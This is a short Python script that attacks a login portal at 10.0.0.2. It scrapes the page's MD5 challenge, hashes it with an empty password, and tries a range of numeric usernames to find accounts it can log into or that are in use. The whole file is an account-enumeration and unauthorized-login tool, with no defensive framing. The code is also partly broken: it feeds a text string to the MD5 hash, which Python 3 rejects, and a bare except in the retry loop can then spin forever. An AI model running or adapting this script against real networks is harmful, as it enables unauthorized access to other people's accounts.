import time
import hashlib
import requests


URL_IP = "http://10.0.0.2"  # No / at the end


def first_html():
    url = f"{URL_IP}/login"
    return requests.get(url).text


def scrap(html, data=""):
    start = html.find("5('")
    end = html.find("');", start)
    p_data = html[start + 3 : end]
    return p_data.replace("' + document.login.password.value + '", data)


def password_gen(data):
    hash_md5 = hashlib.md5()
    hash_md5.update(data)
    return hash_md5.hexdigest()


def login(user, password):
    t1 = time.time()
    url = f"{URL_IP}/login"
    L_data = {"username": user, "password": password}
    login_attempt = requests.post(url, data=L_data, timeout=10)
    response = login_attempt.headers["Content-Length"]
    check = int(response) - len(str(user))
    page = login_attempt.text

    if check < 1600:
        stat = " logged \a"
        requests.get(f"{URL_IP}//logout")
        loged_u.append(user)
        page = first_html()
    elif check < 3500:
        stat = " Used"
        used_u.append(user)
    else:
        stat = "     "
    t2 = time.time()
    total = t2 - t1
    print(str(user) + ": " + stat + " \t\t\tTime: ", total)
    return password_gen(scrap(page))


if __name__ == "__main__":
    first_user = int(input("First User: "))
    last_user = int(input("Last User: "))
    used_u, loged_u = [], []
    pas = password_gen(scrap(first_html()))
    for user in range(first_user, last_user + 1):
        done = False
        while not done:
            try:
                pas = login(user, pas)
                done = True
            except:
                pass
    print("USED:   ", used_u)
    print("LOGGED: ", loged_u)
